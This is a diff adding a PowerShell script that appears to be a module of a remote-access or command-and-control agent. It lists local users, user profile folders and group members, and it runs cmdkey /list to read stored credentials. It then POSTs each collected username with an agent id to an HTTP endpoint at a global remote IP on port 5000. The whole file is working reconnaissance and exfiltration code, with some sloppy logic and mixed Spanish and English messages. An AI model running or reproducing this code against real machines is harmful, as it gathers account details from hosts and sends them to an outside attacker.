@@ -1,0 +1,182 @@
+
+
+
+
+
+
+
+function invoke-getUsers
+    {
+     
+    $good = $false
+    $results = $null
+    
+
+    
+
+    
+
+    $UserList= @()
+    $NetUser = (net user)
+    $results += $NetUser | Out-String
+    
+
+    $LineCount = ($NetUser | Measure).Count
+    
+
+    
+
+    $Count = $LineCount-3
+    
+
+      do {
+        
+
+        
+
+        $LineList = $NetUser[$Count].split(' ')
+        Write-Host("line: "+ $LineList)
+        
+
+        $UserList += $LineList -ne ""
+        
+
+        $Count -= 1
+      }
+      
+
+      
+
+      while ($Count -gt 3)
+      $UserList
+      $usuarios = Get-LocalUser  | ForEach-Object  Name
+      $results += $usuarios | Out-String
+      for ($counter = 0; $counter -lt $usuarios.Count;$counter++)
+        {
+        If (-not ($UserList -contains $usuarios[$counter]))
+            {
+            
+
+            Write-Host("the user does not exist" +  $usuarios[$counter])
+            Write-Host("Adding...")  
+            $UserList += $usuarios[$counter]
+            }
+        }
+
+ 
+      $usuarios = ls C:/Users  | ForEach-Object  Name
+      $results += $usuarios | Out-String
+ 
+      for ($counter = 0; $counter -lt $usuarios.Count;$counter++)
+        {
+        If (-not ($UserList -contains $usuarios[$counter]))
+            {
+            
+
+            Write-Host("the user does not exist:" +  $usuarios[$counter])
+            Write-Host("Adding...")
+            $UserList += $usuarios[$counter]
+            }
+        }
+
+ 
+      $usuarios = get-childitem C:\Users\ | ForEach-Object  Name
+ 
+      $results = $usuarios | Out-String
+      for ($counter = 0; $counter -lt $usuarios.Count;$counter++)
+        {
+        If (-not ($UserList -contains $usuarios[$counter]))
+            {
+            
+
+            Write-Host("No existe el usuario:" +  $usuarios[$counter])
+            Write-Host("Adding...")
+            $UserList += $usuarios[$counter]
+            }
+        }
+
+ 
+      $usuarios = dir C:\Users\ | ForEach-Object  Name  
+ 
+      $results += $usuarios | Out-String
+      for ($counter = 0; $counter -lt $usuarios.Count;$counter++)
+        {
+        If (-not ($UserList -contains $usuarios[$counter]))
+            {
+            
+
+            Write-Host("the user does not exist:" +  $usuarios[$counter])
+            Write-Host("Adding...")
+            $UserList += $usuarios[$counter]
+            }
+        }
+
+   
+      $groups = get-localgroup | ForEach-Object  Name  
+      $results += $groups | Out-String
+      for ($counter = 0; $counter -lt $groups.Count;$counter++)
+        {    
+        $usuarios = net localgroup $groups[$counter] | ForEach-Object  Name
+   
+          for ($i = 0; $i -lt $usuarios.Count;$i++)
+            {    
+            $usuario = ($usuarios[$i]| out-string).split(' ')
+            $usuario = $usuario.Trim()
+            if ($usuario -ne "")
+                {
+           
+                If (-not ($UserList -contains $usuario))
+                    {
+                    
+
+               
+                    Write-Host("the user does not exist:" +  $usuario)
+                    Write-Host("Adding...")
+                    $UserList += $usuario
+                    }
+                }
+            }
+        }
+
+    $listado = cmdkey.exe /list  
+    if( -not $UserList -eq "")
+        {
+        $good = $True
+        }
+
+    $results += $listado  | Out-String
+
+    return @{results=$UserList|Out-String;success=$good;data=@{user=$UserList}}
+    }
+
+
+
+
+
+$execute = {
+  
+}
+
+
+
+
+
+
+$execute = invoke-getUsers
+
+
+
+if($execute.success)
+{ 
+$uri = "http://"+$global:remoteip+":5000/putdata"
+for ($counter=0; $counter -lt $execute.data.user.count; $counter++)
+  {
+  $resp = invoke-webrequest -UseBasicParsing -Method POST -Body @{id=$global:id;user=$execute.data.user[$counter] | Out-String} $uri
+  }
+
+
+
+
+
+}
+return @{results=$execute.results;success=$execute.success}
